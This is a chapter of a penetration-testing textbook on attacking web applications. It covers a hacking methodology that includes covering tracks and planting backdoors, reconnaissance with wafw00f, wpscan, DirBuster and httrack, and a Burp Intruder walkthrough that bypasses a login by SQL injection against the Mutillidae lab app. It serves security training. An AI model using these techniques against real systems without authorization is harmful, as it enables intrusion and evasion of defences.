<html><head></head><body>
  <div id="_idContainer299" class="Basic-Text-Frame">
    <h1 class="chapterNumber">7</h1>
    <h1 id="_idParaDest-180" class="chapterTitle">Exploiting Web-Based Applications</h1>
    <p class="normal">In previous chapters, we reviewed the attacker’s cyber kill chain, the specific approach used to compromise networks and devices and disclose data or hinder access to network resources. In <em class="chapterRef">Chapter 5</em>, <em class="italic">Advanced Social Engineering and Physical Security</em>, we examined the different routes of attack, starting with physical attacks and social engineering. In <em class="chapterRef">Chapter 6</em>, <em class="italic">Wireless and Bluetooth Attacks</em>, we saw how wireless networks could be compromised.</p>
    <p class="normal">With the adoption of technology, we can see multiple virtual banks in the market. These banks do not have any physical infrastructure; they are just made up of simple web/mobile applications. Web-based services are ubiquitous, and most organizations allow remote access to these services with almost constant availability. In this chapter, we’ll focus on one of the most common attack routes through websites, web-based applications, and web services. To penetration testers and attackers, these web applications expose backend services on the network, client-side activities of users accessing the website, and the connection between users and the web application/service’s data.</p>
    <p class="normal">This chapter will focus on the attacker’s perspective when looking at web applications, web services, and client-side exploitation.</p>
    <p class="normal">By the end of this chapter, you will have learned about the following:</p>
    <ul>
      <li class="bulletList">Web application hacking methodology</li>
      <li class="bulletList">The hacker’s mind map</li>
      <li class="bulletList">Vulnerability scanning of web applications/services</li>
      <li class="bulletList">Application-specific attacks</li>
      <li class="bulletList">Exploiting vulnerabilities in crypto and web services</li>
      <li class="bulletList">Maintaining access to compromised systems with web backdoors</li>
      <li class="bulletList">Client-side web application attacks</li>
      <li class="bulletList">Cross-site scripting framework and the BeEF Framework</li>
    </ul>
    <h1 id="_idParaDest-181" class="heading-1">Web application hacking methodology</h1>
    <p class="normal">Systematic <a id="_idIndexMarker734"/>and goal-oriented penetration testing always starts with the right methodology. <em class="italic">Figure 7.1</em> shows a typical web application hack:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_01.png" alt="Diagram  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 7.1: Web application hacking methodology</p>
    <p class="normal">The methodology is<a id="_idIndexMarker735"/> divided into six stages: set target, spider and enumerate, vulnerability scanning, exploitation, cover tracks, and maintain access. These are explained in detail as follows:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1"><strong class="keyWord">Set the target</strong>: Setting the<a id="_idIndexMarker736"/> right target during a penetration test is very important, as attackers will focus more on specific vulnerable systems to gain system-level access, as per the kill chain method.</li>
      <li class="numberedList"><strong class="keyWord">Spider and enumerate</strong>: At this point, attackers have identified the list of web applications and are digging deeper into specific technology versions and their relevant vulnerabilities. Multiple methods are engaged to spider all the web pages, identify technology, and find everything relevant to advance to the next stage.</li>
      <li class="numberedList"><strong class="keyWord">Vulnerability scanning</strong>: All known vulnerabilities are collected during this phase, using well-known vulnerability databases containing public exploits or known common security misconfigurations. </li>
      <li class="numberedList"><strong class="keyWord">Exploitation</strong>: This phase allows the penetration testers to exploit known and unknown vulnerabilities, including the business logic of the application. For example, if an application is vulnerable to admin interface exposure, attackers can try to gain access to the interface by performing various types of attacks such as password guessing or brute-force attacks, or by exploiting specific admin interface vulnerabilities (for<a id="_idIndexMarker737"/> example, a <strong class="keyWord">Java Management eXtensions</strong> (<strong class="keyWord">JMX</strong>) console attack on an admin interface without having to log in, deploy war files, and run a<a id="_idIndexMarker738"/> remote web shell or run commands directly using an <a id="_idIndexMarker739"/>exposed <strong class="keyWord">Application Programming Interface</strong> (<strong class="keyWord">API</strong>) endpoint). </li>
      <li class="numberedList"><strong class="keyWord">Cover tracks</strong>: At this stage, attackers erase all evidence of the hack. For example, if a system has been compromised by a file upload vulnerability and remote commands were executed on the server, attackers would attempt to clear the application server log, web server log, system logs, and other logs. Once tracks are covered, attackers ensure no logs are left that could reveal the origin of their exploitation.</li>
      <li class="numberedList"><strong class="keyWord">Maintain access</strong>: Attackers could potentially plant a backdoor and also go on to perform privilege escalation or use the system as a zombie to perform more focused internal attacks. This could include spreading ransomware on files that are shared<a id="_idIndexMarker740"/> on network drives, or even (in the case of bigger organizations) adding the victim system to a domain to take over the enterprise domain.</li>
    </ol>
    <h1 id="_idParaDest-182" class="heading-1">The hacker’s mind map</h1>
    <p class="normal">There is no <a id="_idIndexMarker741"/>substitute for the human mind. In this section, we will focus more on how a web application looks from the perspective of an attacker. <em class="italic">Figure 7.2</em> shows a mind map of a web application hack:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_02.png" alt="Diagram  Description automatically generated"/></figure>
    <p class="packt_figref"> Figure 7.2: Web application hacking mind map</p>
    <p class="normal">The mind map is split into two categories: attackers can attack either server-side vulnerabilities or client-side vulnerabilities. These vulnerabilities normally occur for one of the following reasons:</p>
    <ul>
      <li class="bulletList">Use of old or unpatched technology</li>
      <li class="bulletList">Poor security configuration for the latest technology</li>
      <li class="bulletList">Design flaw or coding without security in mind</li>
      <li class="bulletList">The human factor: a lack of skilled staff</li>
    </ul>
    <p class="normal">On the server side, attackers would typically perform the following list of attacks:</p>
    <ul>
      <li class="bulletList">Web application firewall evasion</li>
      <li class="bulletList">Injection attacks</li>
      <li class="bulletList">Remote code execution</li>
      <li class="bulletList">File inclusion – remote and local </li>
      <li class="bulletList">Directory path traversal</li>
      <li class="bulletList">Exploiting session management</li>
      <li class="bulletList">Exploiting the business logic of the system or application implementation</li>
      <li class="bulletList">Web services misconfiguration or excess authorization privileges </li>
      <li class="bulletList">Baiting the vulnerable services through shared infrastructure</li>
      <li class="bulletList">Identifying any relevant information that can help them to perform more dedicated attacks</li>
    </ul>
    <p class="normal">Client-side attacks target systems that typically lack the security controls (especially firewalls, intrusion detection systems, and endpoint security protections) found on enterprise systems and endpoints. If these attacks are successful and persistent communication is established, the client device can be used to launch attacks if it is reattached to the target’s network. These attacks are focused on exploiting the vulnerabilities that<a id="_idIndexMarker742"/> exist on the client side, rather than the server side. These could include browsers, applications (thick/thin clients), and networks, as follows:</p>
    <ul>
      <li class="bulletList">Internet Explorer vulnerabilities: Internet Explorer has 1,177 known vulnerabilities (see <a href="https://www.cvedetails.com/product/9900/Microsoft-Internet-Explorer.html?vendor_id=26"><span class="url">https://www.cvedetails.com/product/9900/Microsoft-Internet-Explorer.html?vendor_id=26</span></a>) as of December 2021.</li>
      <li class="bulletList">JavaScript and Java vulnerabilities.</li>
      <li class="bulletList">DNS pinning/rebinding vulnerabilities: DNS rebinding is a DNS-based attack on the code embedded in web pages. Normally, requests from code embedded in web pages (JavaScript, Java, and Flash) are bound to the website they originate from (a same-origin policy). A DNS rebinding attack can be used to improve the ability of JavaScript-based malware to penetrate private networks and subvert the browser’s same-origin policy.</li>
      <li class="bulletList">Client script injection vulnerabilities/cross-site scripting: reflected, persistent (stored), and DOM-based.</li>
    </ul>
    <p class="normal">With these vulnerabilities in mind, attackers are equipped with a full list of exploitation kits and are ready <a id="_idIndexMarker743"/>to start reconnaissance.</p>
    <h1 id="_idParaDest-183" class="heading-1">Reconnaissance of web apps</h1>
    <p class="normal">Web applications <a id="_idIndexMarker744"/>and the delivery of services from those apps are particularly complex. Typically, services are delivered to the end user using a multi-tiered architecture with application servers and web servers that are accessible from the internet, while communicating with middleware services, backend servers, and databases located on the internal network.</p>
    <p class="normal">The complexity is increased by several additional factors that must be taken into account during testing, which include the following:</p>
    <ul>
      <li class="bulletList">Network architecture, including security controls (firewalls, IDS/IPS, and honeypots), and configurations such as load balancers</li>
      <li class="bulletList">The platform architecture (hardware, operating system, and additional applications) of systems that host web services</li>
      <li class="bulletList">Applications, middleware, and final-tier databases, which may employ different platforms (Unix or Windows), vendors, programming languages, and a mix of open source, commercial, and proprietary software</li>
      <li class="bulletList">Authentication and authorization processes, including the process for maintaining session state across the application</li>
      <li class="bulletList">The underlying business logic that governs how the application will be used</li>
      <li class="bulletList">Client-side interactions and communications with the web service</li>
    </ul>
    <p class="normal">Given the proven complexity of web services, it is important for a penetration tester to be adaptable to each site’s specific architecture and service parameters. At the same time, the testing process must be applied consistently to ensure that nothing is missed.</p>
    <p class="normal">Several methodologies have been proposed to accomplish these goals. The most widely accepted one<a id="_idIndexMarker745"/> is the <strong class="keyWord">Open Web Application Security Project</strong> (<strong class="keyWord">OWASP</strong>; see <a href="http://www.owasp.org"><span class="url">www.owasp.org</span></a>) and its list of the top 10 vulnerabilities.</p>
    <p class="normal">As a minimum standard, OWASP provides direction to testers. However, focusing on only the top 10 vulnerabilities is short-sighted, and the methodology has demonstrated some gaps, particularly when applied to finding vulnerabilities in the logic of how an application should work to support business practices.</p>
    <p class="normal">Using the cyber kill chain approach, some activities specific to web application reconnaissance that should be highlighted include the following:</p>
    <ul>
      <li class="bulletList">Identifying the target web app, especially with regard to where and how it is hosted.</li>
      <li class="bulletList">Enumerating the site directory structure and files of the target website, including determining<a id="_idIndexMarker746"/> whether a <strong class="keyWord">content management system</strong> (<strong class="keyWord">CMS</strong>) is in use. This may include downloading the website for offline analysis, including document metadata analysis, and using the site to create a custom wordlist for password cracking (using a tool such as <code class="inlineCode">crunch</code>). It also ensures that all support files are identified.</li>
      <li class="bulletList">Identifying the authentication and authorization mechanisms and determining how the session state is maintained during a transaction with that web service. This will usually involve an analysis of cookies and how they are used, utilizing a proxy tool.</li>
      <li class="bulletList">Enumerating all forms. As these are the primary means for a client to input data and interact with the web app service, they are the location of several exploitable vulnerabilities, such as SQL/XML/JSON injection attacks and cross-site scripting.</li>
      <li class="bulletList">Identifying other areas that accept input, such as pages that allow file upload, as well as any restrictions on accepted upload types.</li>
      <li class="bulletList">Identifying how errors are handled, and the actual error messages that are received by a user. Frequently, the error will provide valuable internal information such as the software version used, or internal filenames and processes.</li>
    </ul>
    <p class="normal">The first step is to <a id="_idIndexMarker747"/>conduct the passive and active reconnaissance previously described (refer to <em class="chapterRef">Chapter 2</em>, <em class="italic">Open-Source Intelligence and Passive Reconnaissance</em>, and <em class="chapterRef">Chapter 3</em>, <em class="italic">Active Reconnaissance of External and Internal Networks</em>).</p>
    <p class="normal">In particular, ensure that hosted sites are identified, and then use DNS mapping to identify all the hosted sites that are delivered by the same server. One of the most common and successful means of attack is to attack a non-target site hosted on the same physical server as the target website, exploit weaknesses in the server to gain root access, and then use the escalated privileges to attack the targeted site.</p>
    <p class="normal">This approach works pretty well in a shared cloud environment, where many applications <a id="_idIndexMarker748"/>are hosted <a id="_idIndexMarker749"/>on the same <strong class="keyWord">Software as a Service</strong> (<strong class="keyWord">SaaS</strong>) model.</p>
    <h2 id="_idParaDest-184" class="heading-2">Detection of web application firewall and load balancers</h2>
    <p class="normal">The next step <a id="_idIndexMarker750"/>is to<a id="_idIndexMarker751"/> identify the presence of network-based protective devices, such as firewalls and IDS/IPS, and identify any deceptive technologies (honeypots). An increasingly common <a id="_idIndexMarker752"/>protective device is the <strong class="keyWord">Web Application Firewall</strong> (<strong class="keyWord">WAF</strong>) and DNS <strong class="keyWord">Content Delivery Network</strong> (<strong class="keyWord">CDN</strong>).</p>
    <p class="normal">If a WAF is being used, testers will need to ensure that the attacks, especially those that rely on crafted input, are encoded to bypass the WAF.</p>
    <p class="normal">WAFs can be identified by manually inspecting cookies (some WAFs tag or modify the cookies that are communicated between the web server and the client), or by changes to the header information (identified when a tester connects to port <code class="inlineCode">80</code> using a command-line tool such as Telnet).</p>
    <p class="normal">The process of WAF detection can be automated using the <code class="inlineCode">nmap</code> script <code class="inlineCode">http-waf-detect.nse</code>, as shown in <em class="italic">Figure 7.3</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_03.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.3: nmap script detecting the WAF on port 80</p>
    <p class="normal">The <code class="inlineCode">nmap</code> script identifies that a WAF is present; however, testing of the script has demonstrated that it is not always accurate in its findings, and that the returned data may be too general to guide an effective strategy to bypass the firewall.</p>
    <p class="normal">The <code class="inlineCode">wafw00f</code> script is an automated tool to identify and fingerprint web-based firewalls; testing has determined that it is the most accurate tool for this purpose. The script is easy to <a id="_idIndexMarker753"/>invoke <a id="_idIndexMarker754"/>from Kali, and ample output is shown in <em class="italic">Figure 7.4</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_04.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.4: wafw00f tool identifying the Cloudflare WAF on the target website</p>
    <p class="normal"><strong class="keyWord">Load balancing detector</strong> (<strong class="keyWord">lbd</strong>) is a <a id="_idIndexMarker755"/>Bash shell script that determines whether a given domain uses DNS and/or HTTP load balancing. This is important information from the perspective of a tester, as it can explain seemingly anomalous results that occur when one server is tested, and then the load balancer switches requests to a different server. <code class="inlineCode">lbd</code> uses a variety of checks to identify the presence of load balancing. Sample output is shown in <em class="italic">Figure 7.5</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_05.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.5: Load balancer detection using DNS HTTP diff</p>
    <h2 id="_idParaDest-185" class="heading-2">Fingerprinting a web application and CMS</h2>
    <p class="normal">Web application<a id="_idIndexMarker756"/> fingerprinting<a id="_idIndexMarker757"/> is the first task for the penetration tester, to find out the version and type of a running web server, and the web technologies implemented. These allow attackers to determine known vulnerabilities and the appropriate exploits.</p>
    <p class="normal">Attackers can utilize any type of command-line tool that has the capability to connect to the remote host. For example, we have used the <code class="inlineCode">netcat</code> command in <em class="italic">Figure 7.6</em> to connect to the victim host on port <code class="inlineCode">80</code>, and issued the <code class="inlineCode">HTTP HEAD</code> command to identify what is being run on the server:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_06.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.6: Banner grabbing through netcat and HTTP request headers</p>
    <p class="normal">This returns an<a id="_idIndexMarker758"/> HTTP<a id="_idIndexMarker759"/> server response that includes the type of web server that the application is being run on, and the <code class="inlineCode">server</code> section providing detailed information about the technology used to build the app—in this case, <code class="inlineCode">PHP 7.1.30</code>.</p>
    <p class="normal">Now, attackers can determine known vulnerabilities using sources such as CVE Details (see <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html"><span class="url">https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html</span></a>).</p>
    <p class="normal">The ultimate goal of penetration testing is to obtain sensitive information. The website should be inspected to determine the <strong class="keyWord">CMS</strong> that has been used to build and maintain it. CMS applications such as Drupal, Joomla, and WordPress, among others, may be configured with a vulnerable administrative interface that allows access to elevated privileges, or may contain exploitable vulnerabilities.</p>
    <p class="normal">Kali includes an automated scanner, <code class="inlineCode">wpscan</code>, that fingerprints a WordPress CMS to determine version information, as follows:</p>
    <pre class="programlisting con"><code class="hljs-con">sudo wpscan –-url &lt;website.com&gt; 
</code></pre>
    <p class="normal">Sample <a id="_idIndexMarker760"/>output<a id="_idIndexMarker761"/> is shown in <em class="italic">Figure 7.7</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_07.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 7.7: Fingerprinting WordPress and scanning using wpscan</p>
    <p class="normal">One particular scanning tool, automated web crawlers, can be used to validate information that has already been gathered, as well as determine the existing directory and file structure of a particular site. Typical findings of web crawlers include administration portals, configuration files (current and previous versions) that may contain hardcoded access credentials and information on the internal structure, backup copies of the website, administrator notes, confidential personal information, and source code.</p>
    <p class="normal">Kali supports several web crawlers, including Burp Suite Community Edition, DirBuster, ZAP, dirb, wfuzz, and CutyCapt. The most commonly used tool is DirBuster.</p>
    <p class="normal">DirBuster is a GUI-driven <a id="_idIndexMarker762"/>application that uses a list of possible<a id="_idIndexMarker763"/> directories and files to perform a brute-force analysis of a website’s structure. Responses can be viewed in a list or a tree format that reflects the site’s structure more accurately. Output from executing this application against a target website is shown in <em class="italic">Figure 7.8</em>.</p>
    <p class="normal">The following are the steps to open DirBuster in the GUI and initiate a scan:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Open the application by running <code class="inlineCode">sudo dirbuster</code> in the terminal or by navigating from <strong class="screenText">Applications</strong> &gt; <strong class="screenText">03 web application analysis</strong> &gt; <strong class="screenText">Web crawlers and directory bruteforce </strong>&gt;<strong class="screenText"> dirbuster</strong>.</li>
      <li class="numberedList">Enter our target website address in <strong class="screenText">Target URL</strong>.</li>
      <li class="numberedList">Select the wordlist by clicking on <strong class="screenText">Browse</strong>; it can be customized, or you can use the well-known wordlists stored in <code class="inlineCode">/usr/share/dirbuster/wordlists/</code>.</li>
      <li class="numberedList">Enter the file extension and click on <strong class="screenText">Start</strong>:<figure class="mediaobject"><img src="../Images/B17765_07_08.png" alt=""/></figure>
        <p class="packt_figref">Figure 7.8: Running OWASP DirBuster to enumerate valid files on the target web application</p>
      </li>
    </ol>
    <h2 id="_idParaDest-186" class="heading-2">Mirroring a website from the command line</h2>
    <p class="normal">Attackers may <a id="_idIndexMarker764"/>need to spend a lot of time identifying the <a id="_idIndexMarker765"/>vulnerabilities in specific pages/URL locations. Common tactics include cloning or downloading all available website information locally to narrow down the right entry point to exploit and performing social engineering attacks to harvest email addresses and other relevant information.</p>
    <p class="normal">It is also possible to copy a website directly to the tester’s location. This allows the tester to review the directory structure and its contents, extract metadata from local files, and use the site’s contents as input to a program such as <code class="inlineCode">crunch</code>, which will produce a personalized wordlist to support password cracking.</p>
    <p class="normal">Once you have mapped out the basic structure of the website and/or web services that are being delivered, the next stage of the kill chain is to identify the vulnerabilities that can be exploited.</p>
    <p class="normal">In Kali Linux 2021.4, this tool is not pre-installed; however, this can be installed by running <code class="inlineCode">sudo apt install httrack</code> in the terminal, and then enter <code class="inlineCode">httrack</code> to see the option for the penetration tester to download all the website’s contents to the local system. <code class="inlineCode">Httrack</code> is both a command-line and GUI utility, widely used to make a local copy of any website. Attackers can directly issue the <code class="inlineCode">httrack http://targetwebapp/ -O outputfolder</code> command, as shown in <em class="italic">Figure 7.9</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_09.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.9: Running the website copier httrack</p>
    <p class="normal">Once <code class="inlineCode">httrack</code> is complete, testers <a id="_idIndexMarker766"/>must be able to load the <a id="_idIndexMarker767"/>application locally and harvest information, identify the hardcoded credentials in HTML comments or backup files, or identify design/implementation flaws.</p>
    <h1 id="_idParaDest-187" class="heading-1">Client-side proxies</h1>
    <p class="normal">A client-side proxy intercepts <a id="_idIndexMarker768"/>HTTP and HTTPS traffic, allowing a penetration tester to examine communications between the user and the application. It allows the tester to copy the data or interact with requests that are sent to the application, therefore allowing them to manipulate or bypass the client-side restrictions.</p>
    <p class="normal">Client-side proxies were initially designed for debugging applications; the same functionality can be abused by attackers to perform man-in-the-middle or man-in-the-browser attacks.</p>
    <p class="normal">Kali comes with several client-side proxies, including Burp Suite and ZAP. After extensive testing, we have come to rely on Burp Proxy, with ZAP as a backup tool. In this section, we will explore<a id="_idIndexMarker769"/> Burp Suite.</p>
    <h2 id="_idParaDest-188" class="heading-2">Burp Proxy</h2>
    <p class="normal">In this section, we’ll<a id="_idIndexMarker770"/> use Mutillidae, the web application that we<a id="_idIndexMarker771"/> installed when building our virtual lab in <em class="chapterRef">Chapter 1</em>, <em class="italic">Goal-Based Penetration Testing</em>. Burp is primarily used to intercept HTTP(S) traffic; the latest version is Burp Suite Community Edition 2021.9.1 (version is 2021.8.2 is installed by default in Kali Linux 2021.4). However, it is part of a larger suite of tools that has several additional functions, including the following:</p>
    <ul>
      <li class="bulletList">An application-aware (built-in information about the applications) tool that performs deep crawling on the target site</li>
      <li class="bulletList">A vulnerability scanner, including a sequencer to test the randomness of session tokens, and a repeater to manipulate and resend requests between the client and the website (the vulnerability scanner is not included with the free version of Burp Proxy that is packaged in Kali)</li>
      <li class="bulletList">An intruder tool that can be used to launch customized attacks (there are speed limitations in the free version of the tool included with Kali; these are removed if you purchase the commercial version of the software)</li>
      <li class="bulletList">The ability to edit existing plugins or write new ones in order to extend the number and type of attacks that can be used</li>
      <li class="bulletList">A decoder to decode well-known cipher text, a comparer to make word- or byte-level comparisons, and an extender to add any third-party add-ons or your own custom code</li>
    </ul>
    <p class="normal">To use Burp, ensure that your web browser is configured to use a local proxy; usually, you will have to adjust the network settings to specify that HTTP and HTTPS traffic must use localhost (<code class="inlineCode">127.0.0.1</code>) at port <code class="inlineCode">8080</code>.</p>
    <p class="normal">After setting up the browser, open the proxy tool by running <code class="inlineCode">burpsuite</code> in the terminal and manually map the application in the<strong class="screenText"> Target</strong> tab. This is accomplished by turning off proxy interception, and then browsing the entire application. Follow every link, submit the forms, and log in to as many areas of the site as possible. </p>
    <p class="normal">Additional content will be inferred from various responses. The next step is to select the target website and right-click <strong class="screenText">Add to scope</strong>, as seen in the following <em class="italic">Figure 7.10</em>.</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_10.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.10: Adding a specific target web application to scope</p>
    <p class="normal">The site map<a id="_idIndexMarker772"/> will <a id="_idIndexMarker773"/>populate an area under the <strong class="screenText">Target</strong> tab. Automated crawling can also be used by navigating to <strong class="screenText">Dashboard</strong> in the main menu, selecting <strong class="screenText">New live task</strong>, selecting <strong class="screenText">Live passive crawl</strong>, then clicking on <strong class="screenText">Scan configuration</strong> and then <strong class="screenText">New…</strong>, typing the <strong class="screenText">Configuration name</strong> as<strong class="keyWord"> </strong><code class="inlineCode">crawl</code> or <code class="inlineCode">deep crawl</code>, and then selecting <strong class="screenText">Links</strong> from <strong class="screenText">Types of item to add</strong> and <strong class="screenText">Everything</strong> in <strong class="screenText">URLs to add</strong>, as seen in the following <em class="italic">Figure 7.11.</em> However, the manual technique gives the tester the opportunity to become more familiar with the target, and it may identify areas to be avoided, such as <code class="inlineCode">/.bak</code> files or <code class="inlineCode">.svn</code> files, which penetration testers often overlook during assessments:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_11.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.11: Scan configuration to crawl a target</p>
    <p class="normal">Once this is <a id="_idIndexMarker774"/>completed, you<a id="_idIndexMarker775"/> can hide items that are not of interest on the site map using display filters. A site map created of a target website is shown in <em class="italic">Figure 7.12</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_12.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.12: Site map of the target web application in Burp Suite</p>
    <p class="normal">Once crawling has<a id="_idIndexMarker776"/> been <a id="_idIndexMarker777"/>completed, manually review the directory and file list for any structures that do not appear to be part of the public website, or that appear to be unintentionally disclosed. For example, directories titled <code class="inlineCode">admin</code>, <code class="inlineCode">backup</code>, <code class="inlineCode">documentation</code>, or <code class="inlineCode">notes</code> should be manually reviewed.</p>
    <p class="normal">We will try some manual testing of the login page in our vulnerable web application running on <code class="inlineCode">http://yourIP/mutillidae/</code> by submitting a single quote to the username and password form. This input produces an error code suggesting that it may be vulnerable to an SQL injection attack; a sample return of the error code is shown in <em class="italic">Figure 7.13</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_13.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.13: Database error on Mutillidae</p>
    <p class="normal">The real strength <a id="_idIndexMarker778"/>of a <a id="_idIndexMarker779"/>proxy is its ability to intercept and modify commands. For this particular example, we will perform an attack to bypass authentication through SQL injection.</p>
    <p class="normal">To launch this attack, ensure that Burp Proxy is configured to intercept communications by going to the <strong class="screenText">Proxy</strong> tab and selecting the <strong class="screenText">Intercept</strong> subtab. Make sure to select <strong class="screenText">Intercept is on</strong>, as shown in <em class="italic">Figure 7.14</em>. When this is completed, open a browser window and access the Mutillidae login page by entering <code class="inlineCode">&lt;IP address&gt;/mutillidae/index.php?page=login.php</code>. Enter variables in the <strong class="screenText">Name</strong> and <strong class="screenText">Password</strong> fields, and then click on the <strong class="screenText">Login</strong> button.</p>
    <p class="normal">If you return to Burp Proxy, you will see that the information that the user entered into the form on the web page was intercepted:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_14.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.14: Intercepting the request sent to the server in Burp Proxy</p>
    <p class="normal">Click <a id="_idIndexMarker780"/>on the <strong class="screenText">Action</strong> button <a id="_idIndexMarker781"/>and select the <strong class="screenText">Send to Intruder </strong>option. Open the main <strong class="screenText">Intruder</strong> tab, and you will see four subtabs, <strong class="screenText">Target</strong>, <strong class="screenText">Positions</strong>, <strong class="screenText">Payloads</strong>, and <strong class="screenText">Options</strong>, as shown in <em class="italic">Figure 7.15</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_15.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.15: Loading the request into Burp Intruder module</p>
    <p class="normal">If you <a id="_idIndexMarker782"/>select <strong class="screenText">Positions</strong>, you <a id="_idIndexMarker783"/>will see that five payload positions were identified from the intercepted information. </p>
    <p class="normal">This attack will use Burp Proxy’s <strong class="screenText">Sniper </strong>mode, which takes a single input from a list provided by the tester and sends this input to a single payload position at a time. Testers will need to clear all the pre-defined positions and select only the ones needed before proceeding. For this example, we will target the <code class="inlineCode">username</code> field, which we suspect is vulnerable based on the returned error message.</p>
    <p class="normal">To define the payload position, we select the <strong class="screenText">Payloads</strong> subtab. In this case, we have selected a simple list. This list can be manually entered or can be filled in by copying from other sources, as shown in <em class="italic">Figure 7.16</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_16.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.16: Adding the payload to the intruder module</p>
    <p class="normal">To launch<a id="_idIndexMarker784"/> the<a id="_idIndexMarker785"/> attack, select <strong class="screenText">Intruder </strong>from the top menu and then select <strong class="screenText">Start Attack</strong>. The proxy will iterate the wordlist against the selected payload positions as legitimate HTTP requests, and it will return the server’s status codes.</p>
    <p class="normal">As you can see in <em class="italic">Figure 7.17</em>, most options produce a status code of <code class="inlineCode">200</code> (request succeeded); however, some of the data returns a status code of <code class="inlineCode">302</code> (request found, indicating that<a id="_idIndexMarker786"/> the<a id="_idIndexMarker787"/> requested resource is presently located under a different URI):</p>
    <figure class="mediaobject"><img src="../Images/B17765_07_17.png" alt=""/></figure>
    <p class="packt_figref">Figure 7.17: Successful SQL injection on the login form to gain access to the application</p>
    <p class="normal">The <code class="inlineCode">302</code> status indicates successful attacks, and the data obtained can successfully be used to log in to the target site.</p>
    <p class="normal">Unfortunately, this is too brief of an overview of Burp Proxy and its capabilities. The free version included with Kali will suffice for many testing tasks; however, serious testers (and attackers) should consider purchasing the commercial version, which provides the option of an<a id="_idIndexMarker788"/> automated<a id="_idIndexMarker789"/> scanner with reporting capabilities and plugins for automating tasks.</p>
    <h2 id="_idParaDest-189" class="heading-2">Web crawling and directory brute-force attacks</h2>
    <p class="normal">Web crawling<a id="_idIndexMarker790"/> is <a id="_idIndexMarker791"/>the <a id="_idIndexMarker792"/>process of getting specific information<a id="_idIndexMarker793"/> from websites using a bot or automated script. Kali provides inbuilt applications to perform this activity. The benefit of web crawling is that it lets you scrape data without having to perform attacks manually, one by one.</p>
    <p class="normal">Attackers can also make use of OWASP DirBuster, dirb, wfuzz, and CutyCapt to perform the same actions.</p>
    <h2 id="_idParaDest-190" class="heading-2">Web service-specific vulnerability scanners</h2>
    <p class="normal">Vulnerability <a id="_idIndexMarker794"/>scanners are <a id="_idIndexMarker795"/>automated tools that crawl an application to identify the signatures of known vulnerabilities.</p>
    <p class="normal">Kali comes with several different preinstalled vulnerability scanners. Penetration testers will typically use two or three comprehensive scanners against the same target to ensure valid results are obtained to achieve the goal of the test. Note that some vulnerability scanners also include an attack functionality.</p>
    <p class="normal">Vulnerability scanners are mostly noisy and are usually detected by the victim. However, scans frequently get ignored as part of regular background activity. In fact, some attackers have been known to launch large-scale scans against a target to camouflage the real attack, or to induce defenders to disable detection systems to reduce the influx of reports that they have to manage.</p>
    <p class="normal">Important vulnerability scanners include the following:</p>
    <table id="table001-4" class="table-container">
      <thead>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Application</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal">Nikto</p>
          </td>
          <td class="table-cell">
            <p class="normal">A Perl-based open source scanner that allows IDS evasion and user changes to scanned modules. This original web scanner is beginning to show its age and is not as accurate as some of the more modern scanners.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Skipfish</p>
          </td>
          <td class="table-cell">
            <p class="normal">A scanner that completes a recursive crawl and dictionary-based crawl to generate an interactive site map of the targeted website, annotated with the output from additional vulnerability scans.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">Wapiti</p>
          </td>
          <td class="table-cell">
            <p class="normal">A Python-based open source vulnerability scanner.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">WebSploit</p>
          </td>
          <td class="table-cell">
            <p class="normal">An advanced <strong class="keyWord">man-in-the-middle</strong> (<strong class="keyWord">MiTM</strong>) framework, useful in wireless and Bluetooth attacks.</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal">ZAP</p>
          </td>
          <td class="table-cell">
            <p class="normal">ZAP is an open-source web application security scanner that covers all the OWASP top 10 vulnerabilities with the ability to perform automated and manual techniques to test for business log flaws along with proxy capability.</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 7.1: Popular vulnerability scanners</p>
    <p class="normal">Kali also <a id="_idIndexMarker796"/>includes <a id="_idIndexMarker797"/>some <a id="_idIndexMarker798"/>application-specific vulnerability <a id="_idIndexMarker799"/>scanners. For example, WPScan is used specifically against <strong class="keyWord">WordPress CMS</strong> applications.</p>
    <h1 id="_idParaDest-191" class="heading-1">Application-specific attacks</h1>
